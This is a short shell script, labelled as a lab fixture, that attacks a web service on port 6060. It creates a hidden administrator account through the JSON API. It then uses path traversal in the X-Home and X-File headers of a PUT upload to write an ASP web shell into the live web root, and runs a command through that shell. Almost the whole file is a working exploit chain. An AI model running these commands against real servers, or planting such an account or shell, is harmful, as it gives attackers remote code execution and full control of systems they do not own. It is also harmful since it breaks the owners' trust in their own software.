#!/bin/sh
# Lab fixture: traversal-to-webshell drop via raw PUT, curl variant.
# Provisions an administrator over the JSON API, then uploads a server page
# whose header-built destination escapes into the live web root.
API="http://target:6060/rps/api/json"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"FromServlet":"Y","LoginName":"svc_backup","Password":"Temp123!","Role":"admin"}' \
  "$API/AddSysUser.do"
printf '<% execute(request("cmd")) %>' > /tmp/shell.aspx
curl -s -X PUT --data @/tmp/shell.aspx \
  -H "X-Home: ../../wwwroot/app" \
  -H "X-File: shell.aspx" \
  -H "Content-Type: application/octet-stream" \
  "http://target:6060/rps/obs7/rpsfile/upload"
curl -s "http://target:6060/app/shell.aspx?cmd=whoami"
